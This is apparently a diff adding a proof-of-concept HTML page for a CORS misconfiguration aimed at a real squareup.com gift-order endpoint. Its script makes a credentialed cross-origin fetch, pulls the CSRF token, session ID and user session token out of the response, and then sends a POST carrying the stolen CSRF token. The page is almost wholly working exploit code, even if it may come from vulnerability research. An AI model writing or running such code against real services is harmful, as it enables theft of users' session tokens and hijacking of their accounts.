@@ -1,0 +1,52 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>CORS PoC</title>
+<pre id="out">Running…</pre>
+<script>
+(async () => {
+  const OUT = document.getElementById('out');
+  const log = (...a)=> OUT.textContent += "\n" + a.join(" ");
+
+  // 1) Replace these with the endpoints you saw in DevTools (Network)
+  const CONFIG_URL = "https://squareup.com/gift/EYTYAT2HRGMH9/order";     // returns the JSON with tokens
+  const SAFE_POST  = "https://squareup.com/gift/EYTYAT2HRGMH9/preview";    // harmless preview/status POST you observed
+
+  // Step A: Read the config cross-origin with cookies
+  const r = await fetch(CONFIG_URL, { method: "GET", credentials: "include" });
+  const body = await r.text();
+  log("CONFIG STATUS:", r.status);
+  log("ACAO:", r.headers.get("Access-Control-Allow-Origin"));
+  log("ACAC:", r.headers.get("Access-Control-Allow-Credentials"));
+  log("CONFIG BODY (first 400):", body.slice(0,400));
+
+  // Try parse JSON
+  let tokens = {};
+  try { tokens = JSON.parse(body); } catch {}
+  const csrf = tokens._csrf_token || "";
+  const sess = tokens.session_id || "";
+  const utok = tokens.user_session_token || "";
+  log("_csrf_token:", csrf ? csrf.slice(0,6)+"…"+csrf.slice(-6) : "missing");
+  log("session_id:",  sess ? sess.slice(0,6)+"…"+sess.slice(-6) : "missing");
+  log("user_session_token:", utok ? utok.slice(0,6)+"…"+utok.slice(-6) : "missing");
+
+  // Stop here if no tokens; reading them already proves cross-origin read.
+  if (!csrf) return;
+
+  // Step B (optional): harmless POST using stolen CSRF header (forces preflight)
+  try {
+    const r2 = await fetch(SAFE_POST, {
+      method: "POST",
+      credentials: "include",
+      headers: { "Content-Type":"application/json", "X-CSRF-Token": csrf },
+      body: JSON.stringify({ preview:true })
+    });
+    const t2 = await r2.text();
+    log("POST STATUS:", r2.status);
+    log("POST ACAO:", r2.headers.get("Access-Control-Allow-Origin"));
+    log("POST ACAC:", r2.headers.get("Access-Control-Allow-Credentials"));
+    log("POST BODY (first 400):", t2.slice(0,400));
+  } catch (e) {
+    log("POST error:", e.toString());
+  }
+})();
+</script>
